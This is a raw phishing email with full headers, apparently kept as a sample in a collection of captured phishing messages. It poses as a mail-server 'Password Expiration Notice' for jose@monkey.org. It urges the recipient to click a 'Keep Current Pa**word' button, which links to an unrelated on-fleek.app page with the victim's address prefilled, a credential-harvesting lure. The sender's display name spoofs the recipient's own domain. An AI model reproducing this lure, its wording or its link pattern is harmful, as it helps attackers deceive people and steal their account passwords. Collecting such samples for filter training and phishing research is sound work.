@@ -1,0 +1,269 @@
+Return-Path: wpmatillano@assistco.com.ph
+Delivered-To: jose@monkey.org
+X-FDA: 82605388194.25.1F218FA
+Received: from cloudcpanel.assistco.com.ph (cloudcpanel.assistco.com.ph
+ [203.167.7.52])	by imf21.b.hostedemail.com (Postfix) with ESMTP id
+ C47A6180002	for <jose@monkey.org>; Thu, 26 Sep 2024 03:01:15 +0000 (UTC)
+Authentication-Results: imf21.b.hostedemail.com;	dkim=pass
+ header.d=assistco.com.ph header.s=default header.b=Ll1rVFyf;	spf=pass
+ (imf21.b.hostedemail.com: domain of wpmatillano@assistco.com.ph designates
+ 203.167.7.52 as permitted sender) smtp.mailfrom=wpmatillano@assistco.com.ph;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1727319598;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=dGB7MMajaSxzdstl3zx/+hVvNQr5qaV4xIaMAOoUIu8=;
+	b=O9cuas+ccMuCkeQQcGJgUXCY6Iy8Dv/+q9Dfxhj+XbFkaJswDptcBMSXNeiBUtbgggRYgA
+	JPZXAnh3jRgkcJXi2GEksWmih0YpeycrPVTr6G0GWIIYTn0B+1WI6iGbnQ1ocLVwlQ0ERE
+	fbs5jUd7r1s6LPnUob78DrOCsUQiyy4=
+ARC-Authentication-Results: i=1;	imf21.b.hostedemail.com;	dkim=pass
+ header.d=assistco.com.ph header.s=default header.b=Ll1rVFyf;	spf=pass
+ (imf21.b.hostedemail.com: domain of wpmatillano@assistco.com.ph designates
+ 203.167.7.52 as permitted sender) smtp.mailfrom=wpmatillano@assistco.com.ph;
+	dmarc=none
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1727319598; a=rsa-sha256;
+	cv=none;
+	b=ysH5goLmhgT7mIlrXvbrLdq2xkiuglo72QNumyPd6dZNU03yaa63Xsa7woQ8LF3ptBxcWU
+	27FlIlHl8J/1PkCYiFV7XeFPl4cXLxUfmJ9X8W4wbXr2Yz+Nono0qfgiCtotdUEPpCyvA3
+	MdpAJmi9QsQDelEPMqQKIfh4vvwlPmk=
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=assistco.com.ph; s=default; h=Content-Transfer-Encoding:Content-Type:
+	MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
+	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+	:Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+	List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=dGB7MMajaSxzdstl3zx/+hVvNQr5qaV4xIaMAOoUIu8=; b=Ll1rVFyfjLS1plFSEARd0LsWuo
+	B1TZ2q7YisAAjxvIg4IzAuO3kngvIU8JE0HL61axnXyJ0bLsz0i2pX2p2XzfzX8tRmdDkK4wyrm5N
+	JQQeRGjWZoZa/XrWNqi04ey0UdG8UQacrLj6oFF6Tx1hLc/BIafh4k5pVhOqhNQP4Gepv7jgbYXL1
+	ZohCLp8mNecsXXfqS3zE9fl9/X9zeL+fyy+SC93YVzguuqEdCD3MV9dGih36R78zi6/34o9cDDyM5
+	ghWHJcjPNAU/PL2HrMUL4VlBxaijkMzn+5j1+tsO26+pacL7HgiDQv6a0In+WWdntNzmbEdNMzyC8
+	m5FWHNbw==;
+Received: from [86.38.225.100] (port=54949 helo=assistco.com.ph)	by
+ cloudcpanel.assistco.com.ph with esmtpsa  (TLS1.2) tls
+ TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384	(Exim 4.96.2)	(envelope-from
+ <wpmatillano@assistco.com.ph>)	id 1stekm-000VNe-0o	for jose@monkey.org;	Thu,
+ 26 Sep 2024 11:01:14 +0800
+From: monkey.org  <wpmatillano@assistco.com.ph>
+To: jose@monkey.org
+Subject: Pa**word Expiration Notice 9/25/2024 8:01:11 p.m.
+Date: 25 Sep 2024 20:01:11 -0700
+Message-ID: <20240925200111.B583C02A677E4AFD@assistco.com.ph>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-AntiAbuse:
+ This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - cloudcpanel.assistco.com.ph
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - assistco.com.ph
+X-Get-Message-Sender-Via:
+ cloudcpanel.assistco.com.ph: authenticated_id: wpmatillano@assistco.com.ph
+X-Authenticated-Sender:
+ cloudcpanel.assistco.com.ph: wpmatillano@assistco.com.ph
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Rspamd-Queue-Id: C47A6180002
+X-Stat-Signature: 6uf3fbnd9s9z6sajt8u5gtnekic8c395
+X-Rspam-User: 
+X-Spam-Status: No, score=0.90
+X-Rspamd-Server: rspam12
+X-HE-Tag: 1727319675-471414
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1/XfUcfTFI6SXpXr397RFEQK9R3c0849DtCmkQVhzk35xw?=
+ =?utf-8?q?y7qSRWqr1vzArlyBwu5OrqepyqdXbfMjP+IuPVkR/XWpwHSZvL+qH3pS26dsml/9o?=
+ =?utf-8?q?GrIRc3vHgt51bqOAWd5XmaBwcoJgyGwNEnqG4/dZa/pSA4wWZtTwCcQs5eb9vFl87?=
+ =?utf-8?q?oy/vVdJw8h9YwC+t1RL28gk5beXk19usMyytoNXP83pQZMjNaShF1ZktAl1gfIUCk?=
+ =?utf-8?q?7DZB8mzhX8osRp5/jY7lm5Jwj51Ia3cohxhZpF1Sx8DMY8vmmpKoMybTdHgaEITR1?=
+ =?utf-8?q?wF1+N1O4vC3tvAZvl64CCaWYBnWPEwukOwzgfHSH+R3vJH0rez2LzcIMFHBXteSG6?=
+ =?utf-8?q?VVOGCCWdlG66xoXoi7ocKXQ44w5E/rzXM5pS9JoINAnXPIh8ja/bvqj9VrsqJjE/T?=
+ =?utf-8?q?OpwkQkGHYktzjvlQHO3eUyM2NB/fhm1Qxh98x6NAWQCRPQiVzDQYz6vYpaRR99gLo?=
+ =?utf-8?q?UP01IV8XywttMEMM1AroHP+pGwA3k3hzVzAAyzoIm8/bgLNxy4Fi0caePggPcjsxx?=
+ =?utf-8?q?4Gle/kAnyoKpM3HNaJgBX6t+FRvQZBVFAbtw1clNrMX+2KV8DaTroxXix2bZHG3Gc?=
+ =?utf-8?q?kug+3J32th6akZ+VSnxIdZIsOFQuMTHj9c9yAWdp4goaIFqB9IPzGSytCTCd1/AkJ?=
+ =?utf-8?q?amzsuvdn5xzP9iyO0u6W8dvMdB39oKfdqKkYDiaUuV3ymjPxtdjkFSNzg8cfNldTL?=
+ =?utf-8?q?ZSl/SZ5aAm5FzPdLHHgm2Bgtg6VBWoD7TW1VEf4JQK5TD8flxJzj6kVoyXWXKiO9F?=
+ =?utf-8?q?9xas22cfx7KN3RqhLk8nQld1nFrol2RiKfRS8QEtT/DJTxtICOU4Ecnpujb27vHTu?=
+ =?utf-8?q?XeAWLagduLj2vEAcT5rlA+tHt13Vk49r2qRsRb9GySodQnsOW5mvIXeOPgE7uIzhW?=
+ =?utf-8?q?QvfWFN8yK+pDNoAocYyGKD_3juRVWqYMIHkOzldH85klAIilZYy/ta+mK8mP7nVhZ?=
+ =?utf-8?q?k/Nki++XA131TAOsQ6CMDG/EY0JENJ6ucVPLPLMrYpcZcQUJqg+jcr3hqhl3qOgrU?=
+ =?utf-8?q?yIzR4BS6u/BSqdB6U8S6pQilIWipFRL2OZIrlUaI86KGaTSf390jT+X92IJLVsD5C?=
+ =?utf-8?q?JvszHV1hnkpA6hXVTRz2PndVcv/tWO+iUNd448uum5T6/Qc9J9ZaZWDpsMunbmKY7?=
+ =?utf-8?q?4+F3dQn8t75Oq1jbB+VdIPxlvtgj9DrO1wwzLL1pva2kvMblGmmbs1lZLtVajSNb1?=
+ =?utf-8?q?bD0G0xFmG7TCF7MlRiA6tcI6b9h4L+i69o+gSeIDUho1+/qFCKbPITp0T8kKfAiCQ?=
+ =?utf-8?q?xtSciWfo2ONh5IiuISZRj0kClRPx2ySBTaPwIjUGK9GX8YS/MAqsB9PHkWevl5tJD?=
+ =?utf-8?q?diakN3msWh+VPrK3XaGVl/9q3m+vXbtL0V5us5MyYjg=3D=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 271
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<table width=3D"640" id=3D"v1m_-442601887071128477m_1390903764397617301m_-7=
+504369737898912045m_-524780866193374026m_5597783185925137768m_-191902743227=
+5701673m_9059299929351650174m_2507583719743760213gmail-yui_3_2_0_1_16130862=
+268097558" style=3D"padding: 0px; text-align: left; color: rgb(68, 68, 68);=
+ text-transform: none; letter-spacing: normal; font-family: &quot;UI Verdan=
+a&quot;, sans-serif, serif, EmojiFont; font-size: 18px; font-style: normal;=
+ font-weight: 400; word-spacing: 0px; white-space: normal;=20
+border-collapse: collapse; box-sizing: border-box; orphans: 2; widows: 2; b=
+ackground-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-v=
+ariant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickn=
+ess: initial; text-decoration-style: initial; text-decoration-color: initia=
+l;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody id=3D"v1m_-442601887071128477m_1390903764397617301m_-750436973789891=
+2045m_-524780866193374026m_5597783185925137768m_-1919027432275701673m_90592=
+99929351650174m_2507583719743760213gmail-yui_3_2_0_1_16130862268097557" sty=
+le=3D'width: 640px; font-family: "Hiragino Kaku Gothic Pro", Meiryo, "MS PG=
+othic", Osaka, Arial, sans-serif; box-sizing: border-box;'>
+<tr id=3D"v1m_-442601887071128477m_1390903764397617301m_-750436973789891204=
+5m_-524780866193374026m_5597783185925137768m_-1919027432275701673m_90592999=
+29351650174m_2507583719743760213gmail-yui_3_2_0_1_16130862268097556" style=
+=3D"box-sizing: border-box;">
+<td width=3D"582" align=3D"right" id=3D"v1m_-442601887071128477m_1390903764=
+397617301m_-7504369737898912045m_-524780866193374026m_5597783185925137768m_=
+-1919027432275701673m_9059299929351650174m_2507583719743760213gmail-yui_3_2=
+_0_1_16130862268097555" valign=3D"bottom" style=3D"padding: 22px 0px; color=
+: rgb(255, 255, 255); font-family: Arial; border-collapse: collapse; box-si=
+zing: border-box; border-spacing: 2px;" bgcolor=3D"#0072c6">
+<font size=3D"4" style=3D'font-family: "Hiragino Kaku Gothic Pro", Meiryo, =
+"MS PGothic", Osaka, Arial, sans-serif; box-sizing: border-box;'><font size=
+=3D"+0" style=3D"box-sizing: border-box;"><span style=3D"font-family: Arial=
+, Helvetica, sans-serif, sans-serif; font-size: 26px; box-sizing: border-bo=
+x;">
+Notification For Your Passcode &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br sty=
+le=3D"box-sizing: border-box;"></span></font></font></td><td width=3D"28" s=
+tyle=3D"padding: 0px; border-collapse: collapse; box-sizing: border-box; bo=
+rder-spacing: 2px;" bgcolor=3D"#0072c6"><br style=3D"box-sizing: border-box=
+;"></td>
+<td width=3D"1" style=3D"padding: 0px; border-collapse: collapse; box-sizin=
+g: border-box; border-spacing: 2px;" bgcolor=3D"#e3e3e3"><br style=3D"box-s=
+izing: border-box;"></td></tr></tbody></table>
+<table width=3D"640" id=3D"v1m_-442601887071128477m_1390903764397617301m_-7=
+504369737898912045m_-524780866193374026m_5597783185925137768m_-191902743227=
+5701673m_9059299929351650174m_2507583719743760213gmail-yui_3_2_0_1_16130862=
+268097530" style=3D"padding: 0px; text-align: left; color: rgb(68, 68, 68);=
+ text-transform: none; letter-spacing: normal; font-family: &quot;UI Verdan=
+a&quot;, sans-serif, serif, EmojiFont; font-size: 18px; font-style: normal;=
+ font-weight: 400; word-spacing: 0px; white-space: normal;=20
+border-collapse: collapse; box-sizing: border-box; orphans: 2; widows: 2; b=
+ackground-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-v=
+ariant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickn=
+ess: initial; text-decoration-style: initial; text-decoration-color: initia=
+l;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody id=3D"v1m_-442601887071128477m_1390903764397617301m_-750436973789891=
+2045m_-524780866193374026m_5597783185925137768m_-1919027432275701673m_90592=
+99929351650174m_2507583719743760213gmail-yui_3_2_0_1_16130862268097529" sty=
+le=3D'width: 640px; font-family: "Hiragino Kaku Gothic Pro", Meiryo, "MS PG=
+othic", Osaka, Arial, sans-serif; box-sizing: border-box;'>
+<tr id=3D"v1m_-442601887071128477m_1390903764397617301m_-750436973789891204=
+5m_-524780866193374026m_5597783185925137768m_-1919027432275701673m_90592999=
+29351650174m_2507583719743760213gmail-yui_3_2_0_1_16130862268097528" style=
+=3D"box-sizing: border-box;"><td width=3D"1" style=3D"padding: 0px; border-=
+bottom-color: rgb(227, 227, 227); border-bottom-width: 1px; border-bottom-s=
+tyle: solid; border-collapse: collapse; box-sizing: border-box; border-spac=
+ing: 2px;" bgcolor=3D"#e3e3e3">
+<br style=3D"box-sizing: border-box;"></td><td width=3D"28" style=3D"paddin=
+g: 0px; border-bottom-color: rgb(227, 227, 227); border-bottom-width: 1px; =
+border-bottom-style: solid; border-collapse: collapse; box-sizing: border-b=
+ox; border-spacing: 2px;" bgcolor=3D"#ffffff"><br style=3D"box-sizing: bord=
+er-box;"></td>
+<td width=3D"582" id=3D"v1m_-442601887071128477m_1390903764397617301m_-7504=
+369737898912045m_-524780866193374026m_5597783185925137768m_-191902743227570=
+1673m_9059299929351650174m_2507583719743760213gmail-yui_3_2_0_1_16130862268=
+097527" valign=3D"top" style=3D"padding: 20px 0px 30px; border-bottom-color=
+: rgb(227, 227, 227); border-bottom-width: 1px; border-bottom-style: solid;=
+ border-collapse: collapse; box-sizing: border-box; border-spacing: 2px;" b=
+gcolor=3D"#ffffff">
+<font size=3D"2" style=3D"box-sizing: border-box;"><font color=3D"#000000" =
+style=3D"box-sizing: border-box;"><b style=3D"font-weight: bolder; box-sizi=
+ng: border-box;">Hello jose</b></font><font color=3D"#000000" style=3D"box-=
+sizing: border-box;"><b style=3D"font-weight: bolder; box-sizing: border-bo=
+x;"><br style=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-b=
+ox;"></b>Your password for&nbsp;jose@monkey.org expires today<br style=3D"b=
+ox-sizing: border-box;">
+Follow instruction below to keep your current password and update your acco=
+unt.</font><font color=3D"#3d85c6" style=3D"box-sizing: border-box;"><br st=
+yle=3D"box-sizing: border-box;"></font></font><span style=3D"font-size: sma=
+ll; box-sizing: border-box;"><br style=3D"box-sizing: border-box;"></span>
+<div id=3D"v1m_-442601887071128477m_1390903764397617301m_-75043697378989120=
+45m_-524780866193374026m_5597783185925137768m_-1919027432275701673m_9059299=
+929351650174m_2507583719743760213gmail-yui_3_2_0_1_16130862268097526" style=
+=3D"font-family: arial, sans-serif, serif, EmojiFont; font-size: 12px; box-=
+sizing: border-box;">
+<a id=3D"v1m_-442601887071128477m_1390903764397617301m_-7504369737898912045=
+m_-524780866193374026m_5597783185925137768m_-1919027432275701673m_905929992=
+9351650174m_2507583719743760213gmail-yui_3_2_0_1_16130862268097525" style=
+=3D'margin: 0px; padding: 14px 7px; border-radius: 4px; width: 210px; text-=
+align: center; color: white; font-family: "Open Sans", "Helvetica Neue", Ar=
+ial; font-size: 15px; text-decoration: none; display: block; max-width: 210=
+px; box-sizing: border-box; background-color: rgb(0,=20
+126, 230);' href=3D"https://harsh-continent-melodic.on-fleek.app/index.xhtm=
+l#jose@monkey.org" target=3D"_blank" rel=3D"noreferrer">Keep Current Pa**wo=
+rd</a><div style=3D'color: rgb(0, 0, 0); font-family: "Hiragino Kaku Gothic=
+ Pro", Meiryo, "MS PGothic", Osaka, Arial, sans-serif; box-sizing: border-b=
+ox;'>&nbsp;</div>
+<div style=3D'color: rgb(0, 0, 0); font-family: "Hiragino Kaku Gothic Pro",=
+ Meiryo, "MS PGothic", Osaka, Arial, sans-serif; box-sizing: border-box;'><=
+br style=3D"box-sizing: border-box;"></div></div>
+<table id=3D"v1m_-442601887071128477m_1390903764397617301m_-750436973789891=
+2045m_-524780866193374026m_5597783185925137768m_-1919027432275701673m_90592=
+99929351650174m_2507583719743760213gmail-yui_3_2_0_1_16130862268097552" sty=
+le=3D"padding: 0px; border-collapse: collapse; box-sizing: border-box;" bor=
+der=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody id=3D"v1m_-442601887071128477m_1390903764397617301m_-750436973789891=
+2045m_-524780866193374026m_5597783185925137768m_-1919027432275701673m_90592=
+99929351650174m_2507583719743760213gmail-yui_3_2_0_1_16130862268097551" sty=
+le=3D"width: 610px; box-sizing: border-box;">
+<tr id=3D"v1m_-442601887071128477m_1390903764397617301m_-750436973789891204=
+5m_-524780866193374026m_5597783185925137768m_-1919027432275701673m_90592999=
+29351650174m_2507583719743760213gmail-yui_3_2_0_1_16130862268097550" style=
+=3D"box-sizing: border-box;">
+<td width=3D"100%" id=3D"v1m_-442601887071128477m_1390903764397617301m_-750=
+4369737898912045m_-524780866193374026m_5597783185925137768m_-19190274322757=
+01673m_9059299929351650174m_2507583719743760213gmail-yui_3_2_0_1_1613086226=
+8097549" style=3D"padding: 20px 0px 0px; color: rgb(61, 61, 61); font-famil=
+y: Arial, sans-serif; font-size: 10px; border-top-color: rgb(227, 227, 227)=
+; border-top-width: 1px; border-top-style: solid; border-collapse: collapse=
+; box-sizing: border-box; border-spacing: 2px;">
+<table id=3D"v1m_-442601887071128477m_1390903764397617301m_-750436973789891=
+2045m_-524780866193374026m_5597783185925137768m_-1919027432275701673m_90592=
+99929351650174m_2507583719743760213gmail-yui_3_2_0_1_16130862268097548" sty=
+le=3D"padding: 0px; width: 509px; font-family: Roboto, RobotoDraft, Helveti=
+ca, Arial, sans-serif; border-collapse: collapse; box-sizing: border-box;" =
+border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody id=3D"v1m_-442601887071128477m_1390903764397617301m_-750436973789891=
+2045m_-524780866193374026m_5597783185925137768m_-1919027432275701673m_90592=
+99929351650174m_2507583719743760213gmail-yui_3_2_0_1_16130862268097547" sty=
+le=3D'width: 509px; font-family: "Hiragino Kaku Gothic Pro", Meiryo, "MS PG=
+othic", Osaka, Arial, sans-serif; box-sizing: border-box;'>
+<tr id=3D"v1m_-442601887071128477m_1390903764397617301m_-750436973789891204=
+5m_-524780866193374026m_5597783185925137768m_-1919027432275701673m_90592999=
+29351650174m_2507583719743760213gmail-yui_3_2_0_1_16130862268097546" style=
+=3D'color: rgb(64, 64, 64); line-height: 26px; font-family: "Open Sans", He=
+lveticaNeue-Light, "Helvetica Neue Light", "Helvetica Neue", Helvetica, Ari=
+al, "Lucida Grande", sans-serif; font-size: 16px; box-sizing: border-box;'>=
+
+<td id=3D"v1m_-442601887071128477m_1390903764397617301m_-750436973789891204=
+5m_-524780866193374026m_5597783185925137768m_-1919027432275701673m_90592999=
+29351650174m_2507583719743760213gmail-yui_3_2_0_1_16130862268097545" style=
+=3D"font-family: &quot;Hiragino Kaku Gothic Pro&quot;, Meiryo, &quot;MS PGo=
+thic&quot;, Osaka, Arial, sans-serif; box-sizing: border-box; border-spacin=
+g: 2px;">
+<p id=3D"v1m_-442601887071128477m_1390903764397617301m_-7504369737898912045=
+m_-524780866193374026m_5597783185925137768m_-1919027432275701673m_905929992=
+9351650174m_2507583719743760213gmail-yui_3_2_0_1_16130862268097544" style=
+=3D"margin: 0px; padding: 0px; line-height: normal; box-sizing: border-box;=
+"><font color=3D"#000000" style=3D"box-sizing: border-box;"><font size=3D"2=
+" style=3D"box-sizing: border-box;">2024 monkey.org ServerNotification For =
+Your Passcode.</font></font></p></td></tr></tbody></table>
+</td></tr></tbody></table></td></tr></tbody></table></body></html>
+
